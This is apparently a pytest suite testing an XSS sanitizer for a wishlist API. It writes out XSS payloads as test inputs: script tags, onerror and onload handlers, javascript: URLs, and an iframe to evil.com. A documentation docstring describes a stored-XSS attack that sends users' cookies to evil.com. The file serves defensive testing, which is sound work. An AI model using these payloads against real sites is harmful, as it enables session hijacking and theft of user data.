"""
Test cases for XSS Vulnerability in Wishlist API (CWE-79).

This test suite verifies that user input is properly sanitized to prevent
Cross-Site Scripting attacks.

SECURITY IMPACT:
- CWE-79: Cross-site Scripting (XSS)
- Stored XSS: Malicious scripts stored in item names
- Reflected XSS: User input reflected without encoding
- Session hijacking via stolen cookies

Apply the fixes from backend/xss_fix.py.
"""
import pytest


class TestXSSPrevention:
    """Test cases verifying XSS payloads are sanitized."""

    def test_script_tag_stripped(self):
        """Script tags should be completely stripped."""
        from backend.xss_fix import sanitize_for_html
        
        payload = "<script>alert('XSS')</script>"
        result = sanitize_for_html(payload)
        
        assert "<script>" not in result
        assert "alert" not in result
        assert "XSS" not in result or result == "alertXSS"

    def test_img_onerror_stripped(self):
        """IMG onerror handlers should be stripped."""
        from backend.xss_fix import sanitize_for_html
        
        payload = '<img src=x onerror="alert(1)">'
        result = sanitize_for_html(payload)
        
        assert "onerror" not in result
        assert "alert" not in result

    def test_svg_onload_stripped(self):
        """SVG onload handlers should be stripped."""
        from backend.xss_fix import sanitize_for_html
        
        payload = '<svg onload="alert(1)">'
        result = sanitize_for_html(payload)
        
        assert "onload" not in result

    def test_js_url_stripped(self):
        """JavaScript URLs should be stripped."""
        from backend.xss_fix import sanitize_for_html
        
        payload = 'javascript:alert(1)'
        result = sanitize_for_html(payload)
        
        assert "javascript:" not in result

    def test_event_handlers_stripped(self):
        """All event handlers should be stripped."""
        from backend.xss_fix import sanitize_for_html
        
        handlers = [
            'onclick',
            'onmouseover',
            'onerror',
            'onload',
            'onfocus',
            'onblur',
        ]
        
        for handler in handlers:
            payload = f'<div {handler}="alert(1)">test</div>'
            result = sanitize_for_html(payload)
            
            assert handler not in result, f"Handler {handler} was not stripped"

    def test_entity_encoding_neutralized(self):
        """HTML entity encoding should be neutralized."""
        from backend.xss_fix import sanitize_for_html
        
        # Encoded script tag
        payload = "&lt;script&gt;alert(1)&lt;/script&gt;"
        result = sanitize_for_html(payload)
        
        # bleach converts entities to literal characters, then strips tags
        assert "<script>" not in result

    def test_iframe_stripped(self):
        """Iframe injection should be blocked."""
        from backend.xss_fix import sanitize_for_html
        
        payload = '<iframe src="https://evil.com"></iframe>'
        result = sanitize_for_html(payload)
        
        assert "<iframe>" not in result

    def test_style_injection_blocked(self):
        """CSS injection should be blocked."""
        from backend.xss_fix import sanitize_for_html
        
        payload = '<div style="background: url(javascript:alert(1))">test</div>'
        result = sanitize_for_html(payload)
        
        assert "javascript:" not in result


class TestSafeWishlistItem:
    """Test the SafeWishlistItem model with XSS protection."""

    def test_valid_item_accepted(self):
        """Normal item names should be accepted."""
        from backend.xss_fix import SafeWishlistItem
        
        item = SafeWishlistItem(item="iPhone 15 Pro Max")
        assert item.item == "iPhone 15 Pro Max"

    def test_xss_payload_rejected(self):
        """XSS payloads should be sanitized, not rejected."""
        from backend.xss_fix import SafeWishlistItem
        
        payload = "<script>alert('XSS')</script>"
        item = SafeWishlistItem(item=payload)
        
        # Script tag should be stripped
        assert "<script>" not in item.item

    def test_max_length_enforced(self):
        """Items exceeding max length should be rejected."""
        from backend.xss_fix import SafeWishlistItem
        from pydantic import ValidationError
        
        long_item = "x" * 500
        with pytest.raises(ValidationError):
            SafeWishlistItem(item=long_item)

    def test_empty_item_rejected(self):
        """Empty items should be rejected."""
        from backend.xss_fix import SafeWishlistItem
        from pydantic import ValidationError
        
        with pytest.raises(ValidationError):
            SafeWishlistItem(item="")

    def test_whitespace_only_rejected(self):
        """Whitespace-only items should be rejected."""
        from backend.xss_fix import SafeWishlistItem
        from pydantic import ValidationError
        
        with pytest.raises(ValidationError):
            SafeWishlistItem(item="   \t\n   ")


class TestEscapeFunctions:
    """Test HTML escaping utility functions."""

    def test_escape_html(self):
        """Test HTML escaping for safe display."""
        from backend.xss_fix import escape_html
        
        assert escape_html("<") == "&lt;"
        assert escape_html(">") == "&gt;"
        assert escape_html("&") == "&amp;"
        assert escape_html('"') == "&quot;"
        assert escape_html("'") == "&#x27;"

    def test_escape_html_attr(self):
        """Test HTML attribute escaping."""
        from backend.xss_fix import escape_html_attr
        
        assert escape_html_attr("&") == "&amp;"
        assert escape_html_attr('"') == "&quot;"

    def test_escape_html_safe_content(self):
        """Safe content should remain unchanged."""
        from backend.xss_fix import escape_html
        
        safe_text = "Hello World 123"
        assert escape_html(safe_text) == safe_text


class TestValidateItemName:
    """Test the validate_item_name function."""

    def test_valid_name(self):
        """Valid item names should pass through."""
        from backend.xss_fix import validate_item_name
        
        assert validate_item_name("iPhone 15") == "iPhone 15"
        assert validate_item_name("Product-123") == "Product-123"

    def test_xss_stripped(self):
        """XSS should be stripped from item names."""
        from backend.xss_fix import validate_item_name
        
        result = validate_item_name("<script>alert(1)</script>")
        assert "<script>" not in result

    def test_empty_rejected(self):
        """Empty names should raise ValueError."""
        from backend.xss_fix import validate_item_name
        
        with pytest.raises(ValueError):
            validate_item_name("")

    def test_truncation(self):
        """Names over 200 chars should be truncated."""
        from backend.xss_fix import validate_item_name
        
        long_name = "x" * 300
        result = validate_item_name(long_name)
        
        assert len(result) == 200


class TestVulnerabilityDocumentation:
    """Document the XSS vulnerability and fix."""

    def test_xss_vulnerability_explained(self):
        """
        DOCUMENTATION: CWE-79 - Cross-site Scripting (XSS)
        
        VULNERABLE PATTERN:
        @app.post("/api/wishlist")
        def add_to_wishlist(item: str):
            wishlist.append(item)  # NO sanitization!
            return {"item": item}  # Reflects unsanitized input
        
        ATTACK:
        1. Attacker adds item: "<script>document.location='evil.com?c='+doc..."</script>
        2. Item is stored without sanitization
        3. When other users view the wishlist, script executes
        
        SECURE PATTERN:
        from backend.xss_fix import SafeWishlistItem, sanitize_for_html
        
        @app.post("/api/wishlist")
        def add_to_wishlist(item_data: SafeWishlistItem):
            return {"item": item_data.item}  # Already sanitized
        
        This test documents that the fix is needed.
        """
        # Verify the fix module exists
        try:
            from backend import xss_fix
            assert hasattr(xss_fix, 'sanitize_for_html')
            assert hasattr(xss_fix, 'SafeWishlistItem')
            assert hasattr(xss_fix, 'escape_html')
        except ImportError:
            pytest.fail("XSS fix module not found")


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
